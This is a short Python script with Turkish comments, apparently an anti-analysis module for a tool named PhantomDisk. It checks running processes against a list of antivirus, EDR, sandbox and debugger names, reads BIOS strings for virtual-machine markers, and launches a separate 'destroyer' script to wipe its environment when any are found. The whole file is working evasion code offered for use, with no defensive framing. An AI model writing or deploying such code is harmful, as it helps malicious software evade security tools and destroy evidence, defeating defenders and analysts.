#!/usr/bin/env python3
"""
PhantomDisk - Anti-AV / Sandbox / VM Tespit Modülü
Geliştirici: burakcanbalta | 2025
Amaç: Phantom ortamının analiz, sanal makine, sandbox, AV veya EDR tarafından incelenip incelenmediğini tespit etmek.
"""

import os
import time
import subprocess
import psutil
import platform

MOUNT_POINT = "/mnt/phantomdisk"
DESTROYER_PATH = "modules/phantom_destroyer.py"
CHECK_INTERVAL = 10  # saniyede bir kontrol

DETECT_PROCESSES = [
    "vboxservice", "vboxtray", "vmtoolsd", "vmwaretray", "wireshark",
    "tcpdump", "xenservice", "procmon", "sysinternals", "sandboxie",
    "avast", "avg", "kaspersky", "crowdstrike", "carbonblack", "bitdefender",
    "qemu-ga", "malwarebytes", "remnux", "cuckoo", "fiddler", "ida64", "ida"
]

def check_processes():
    for proc in psutil.process_iter(['name']):
        try:
            name = proc.info['name'].lower()
            for keyword in DETECT_PROCESSES:
                if keyword in name:
                    print(f"[!] Tehlikeli süreç tespit edildi: {name}")
                    return True
        except:
            continue
    return False

def check_vm_env():
    vm_indicators = ["VBOX", "VirtualBox", "VMware", "Xen", "KVM", "QEMU", "Hyper-V"]
    try:
        bios_info = os.popen("dmidecode -s system-product-name").read()
        for indicator in vm_indicators:
            if indicator.lower() in bios_info.lower():
                print(f"[!] Sanal ortam tespit edildi: {indicator}")
                return True
    except:
        pass
    return False

def anti_analysis_watchdog():
    while True:
        if check_processes() or check_vm_env():
            print("[X] Güvenlik ortamı tespit edildi. RAM ortamı yok ediliyor...")
            subprocess.call(["python3", DESTROYER_PATH])
            break
        time.sleep(CHECK_INTERVAL)

if __name__ == "__main__":
    print("=== Phantom Anti-AV / Sandbox Modülü Başlatıldı ===")
    anti_analysis_watchdog()
